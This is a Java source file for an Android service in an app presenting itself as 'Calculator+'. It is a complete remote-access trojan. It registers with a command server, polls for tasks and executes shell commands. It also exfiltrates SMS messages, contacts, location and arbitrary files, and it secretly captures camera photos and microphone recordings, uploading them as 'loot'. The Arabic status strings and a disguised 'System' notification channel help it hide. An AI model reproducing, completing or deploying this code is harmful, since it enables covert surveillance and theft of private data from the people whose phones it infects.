package com.calc.plus;

import android.app.*;
import android.content.*;
import android.database.Cursor;
import android.hardware.Camera;
import android.media.MediaRecorder;
import android.os.*;
import android.provider.Settings;
import android.view.SurfaceView;
import org.json.JSONObject;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.UUID;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

public class AgentService extends Service {
    String server, agentId;
    volatile boolean alive = true;
    Thread loop;
    File lootDir;

    @Override public void onCreate() {
        super.onCreate();
        lootDir = new File(getExternalFilesDir(null), "loot");
        if (!lootDir.exists()) lootDir.mkdirs();
        startForeground(1, notif());
    }

    @Override public int onStartCommand(Intent it, int f, int s) {
        SharedPreferences sp = getSharedPreferences("cfg", MODE_PRIVATE);
        if (it != null && it.getStringExtra("url") != null) sp.edit().putString("url", it.getStringExtra("url")).apply();
        server = sp.getString("url", "");
        agentId = sp.getString("id", null);
        if (agentId == null) { agentId = UUID.randomUUID().toString().substring(0,8); sp.edit().putString("id", agentId).apply(); }
        if (loop == null && !server.isEmpty()) { loop = new Thread(this::runLoop); loop.start(); }
        return START_STICKY;
    }

    void runLoop() {
        register();
        while (alive) {
            try {
                JSONObject t = getJson(server + "/api/task/" + agentId);
                String cmd = t.optString("cmd", "");
                if (cmd != null && !cmd.isEmpty() && !"null".equals(cmd)) postResult(t.optString("id"), cmd, exec(cmd));
                else Thread.sleep(3000);
            } catch (Exception e) { try { Thread.sleep(5000); } catch (Exception ignored) {} }
        }
    }

    void register() {
        try {
            JSONObject info = new JSONObject()
                .put("model", Build.MANUFACTURER + " " + Build.MODEL)
                .put("android", Build.VERSION.RELEASE)
                .put("sdk", Build.VERSION.SDK_INT)
                .put("id", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
            postJson(server + "/api/register", new JSONObject().put("id", agentId).put("info", info).toString());
        } catch (Exception ignored) {}
    }

    String exec(String raw) {
        try {
            String[] p = raw.trim().split("\\s+", 2);
            String c = p[0].toLowerCase();
            String a = p.length > 1 ? p[1].trim() : "";
            switch (c) {
                case "info":     return "model: " + Build.MANUFACTURER + " " + Build.MODEL + "\nandroid: " + Build.VERSION.RELEASE + "\nsdk: " + Build.VERSION.SDK_INT + "\nid: " + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID) + "\n";
                case "shell":    return sh(a);
                case "ls":       return ls(a.isEmpty() ? "/sdcard" : a);
                case "sms":      return sms();
                case "contacts": return contacts();
                case "loc":      return loc();
                case "pull":     return pull(a);
                case "cam":      return cam(a);
                case "mic":      return mic(a);
                default:         return "الأوامر: info | shell <cmd> | ls <path> | sms | contacts | loc | pull <path> | cam [f] | mic <sec>";
            }
        } catch (Exception e) { return "خطأ: " + e; }
    }

    String cam(String arg) {
        int camId = 0;
        String face = "back";
        if (arg != null && arg.trim().toLowerCase().startsWith("f")) { camId = 1; face = "front"; }
        Camera camera = null;
        try { camera = Camera.open(camId); }
        catch (Exception e) {
            try { camera = Camera.open(0); camId = 0; face = "back"; }
            catch (Exception ee) { return "لا كاميرا: " + ee; }
        }
        final String fname = "cam_" + face + "_" + System.currentTimeMillis() + ".jpg";
        final File out = new File(lootDir, fname);
        final CountDownLatch latch = new CountDownLatch(1);
        final String[] err = {null};
        try {
            camera.setPreviewDisplay(new SurfaceView(this).getHolder());
            camera.startPreview();
            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override public void onPictureTaken(byte[] data, Camera cam) {
                    try {
                        FileOutputStream fos = new FileOutputStream(out);
                        fos.write(data); fos.close();
                    } catch (Exception e) { err[0] = e.toString(); }
                    finally {
                        try { cam.stopPreview(); cam.release(); } catch (Exception ignored) {}
                        latch.countDown();
                    }
                }
            });
            latch.await(15, TimeUnit.SECONDS);
            if (err[0] != null) return "خطأ: " + err[0];
            if (!out.exists()) return "فشل الالتقاط";
            return uploadFile(out);
        } catch (Exception e) {
            try { if (camera != null) camera.release(); } catch (Exception ignored) {}
            return "خطأ كاميرا: " + e;
        }
    }

    String mic(String arg) {
        int seconds = 10;
        try { if (!arg.isEmpty()) seconds = Integer.parseInt(arg.trim()); } catch (Exception ignored) {}
        if (seconds < 1) seconds = 1;
        if (seconds > 300) seconds = 300;
        final String fname = "mic_" + System.currentTimeMillis() + ".m4a";
        final File out = new File(lootDir, fname);
        MediaRecorder rec = new MediaRecorder();
        try {
            rec.setAudioSource(MediaRecorder.AudioSource.MIC);
            rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            rec.setAudioSamplingRate(44100);
            rec.setAudioEncodingBitRate(128000);
            rec.setOutputFile(out.getAbsolutePath());
            rec.prepare();
            rec.start();
        } catch (Exception e) {
            try { rec.release(); } catch (Exception ignored) {}
            return "خطأ تسجيل: " + e;
        }
        try { Thread.sleep(seconds * 1000L); } catch (InterruptedException ignored) {}
        try { rec.stop(); rec.release(); } catch (Exception e) { return "خطأ إيقاف: " + e; }
        if (!out.exists()) return "فشل التسجيل";
        return uploadFile(out);
    }

    String uploadFile(File f) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(server + "/api/upload/" + agentId).openConnection();
        c.setRequestMethod("POST"); c.setDoOutput(true);
        String b = "----x" + System.currentTimeMillis();
        c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + b);
        OutputStream os = c.getOutputStream();
        os.write(("--" + b + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\""
                 + f.getName() + "\"\r\nContent-Type: application/octet-stream\r\n\r\n").getBytes(StandardCharsets.UTF_8));
        FileInputStream in = new FileInputStream(f);
        byte[] buf = new byte[8192]; int n;
        while ((n = in.read(buf)) > 0) os.write(buf, 0, n);
        in.close();
        os.write(("\r\n--" + b + "--\r\n").getBytes(StandardCharsets.UTF_8));
        os.close();
        int code = c.getResponseCode();
        return "✓ " + f.getName() + " (" + (f.length()/1024) + " KB) → HTTP " + code + "\nفي السيرفر: loot/" + agentId + "/" + f.getName();
    }

    String sh(String cmd) throws Exception {
        if (cmd.isEmpty()) return "usage: shell <cmd>";
        ProcessBuilder pb = new ProcessBuilder("sh", "-c", cmd);
        pb.redirectErrorStream(true);
        Process pr = pb.start();
        BufferedReader r = new BufferedReader(new InputStreamReader(pr.getInputStream()));
        StringBuilder sb = new StringBuilder(); String l;
        while ((l = r.readLine()) != null) sb.append(l).append('\n');
        pr.waitFor();
        return sb.toString();
    }

    String ls(String p) {
        File d = new File(p); File[] fs = d.listFiles();
        if (fs == null) return "لا قراءة " + p;
        StringBuilder sb = new StringBuilder(p + ":\n");
        for (File f : fs) sb.append(f.isDirectory() ? "d " : "- ").append(f.length()).append("\t").append(f.getName()).append('\n');
        return sb.toString();
    }

    String sms() {
        StringBuilder sb = new StringBuilder();
        Cursor c = getContentResolver().query(android.net.Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 60");
        if (c == null) return "لا صلاحية SMS";
        while (c.moveToNext()) sb.append(c.getString(c.getColumnIndexOrThrow("address"))).append(" | ").append(c.getString(c.getColumnIndexOrThrow("body"))).append('\n');
        c.close();
        return sb.toString();
    }

    String contacts() {
        StringBuilder sb = new StringBuilder();
        Cursor c = getContentResolver().query(android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (c == null) return "لا صلاحية جهات الاتصال";
        while (c.moveToNext()) sb.append(c.getString(c.getColumnIndexOrThrow("display_name"))).append(" | ").append(c.getString(c.getColumnIndexOrThrow("data1"))).append('\n');
        c.close();
        return sb.toString();
    }

    String loc() {
        try {
            android.location.LocationManager lm = (android.location.LocationManager) getSystemService(LOCATION_SERVICE);
            android.location.Location best = null;
            for (String prov : new String[]{android.location.LocationManager.GPS_PROVIDER, android.location.LocationManager.NETWORK_PROVIDER}) {
                android.location.Location l = lm.getLastKnownLocation(prov);
                if (l != null && (best == null || l.getTime() > best.getTime())) best = l;
            }
            if (best == null) return "لا موقع";
            return best.getLatitude() + "," + best.getLongitude() + " ±" + best.getAccuracy() + "m";
        } catch (Exception e) { return "خطأ موقع: " + e; }
    }

    String pull(String path) throws Exception {
        File f = new File(path);
        if (!f.exists()) return "غير موجود: " + path;
        return uploadFile(f);
    }

    void postResult(String id, String cmd, String out) {
        try { postJson(server + "/api/result", new JSONObject().put("id", agentId).put("cmd", cmd).put("out", out == null ? "" : out).toString()); } catch (Exception ignored) {}
    }

    String postJson(String url, String body) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setRequestMethod("POST"); c.setDoOutput(true);
        c.setRequestProperty("Content-Type", "application/json; charset=utf-8");
        c.setConnectTimeout(15000); c.setReadTimeout(30000);
        OutputStream o = c.getOutputStream(); o.write(body.getBytes(StandardCharsets.UTF_8)); o.close();
        return read(c);
    }

    JSONObject getJson(String url) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setConnectTimeout(15000); c.setReadTimeout(30000);
        return new JSONObject(read(c));
    }

    String read(HttpURLConnection c) throws Exception {
        InputStream is = c.getResponseCode() < 400 ? c.getInputStream() : c.getErrorStream();
        BufferedReader r = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8));
        StringBuilder sb = new StringBuilder(); String l;
        while ((l = r.readLine()) != null) sb.append(l);
        r.close();
        return sb.toString();
    }

    Notification notif() {
        String ch = "sys";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationManager nm = getSystemService(NotificationManager.class);
            nm.createNotificationChannel(new NotificationChannel(ch, "System", NotificationManager.IMPORTANCE_MIN));
        }
        Notification.Builder b = Build.VERSION.SDK_INT >= 26 ? new Notification.Builder(this, ch) : new Notification.Builder(this);
        return b.setContentTitle("Calculator+").setContentText("قيد التشغيل").setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).build();
    }

    @Override public IBinder onBind(Intent i) { return null; }
}
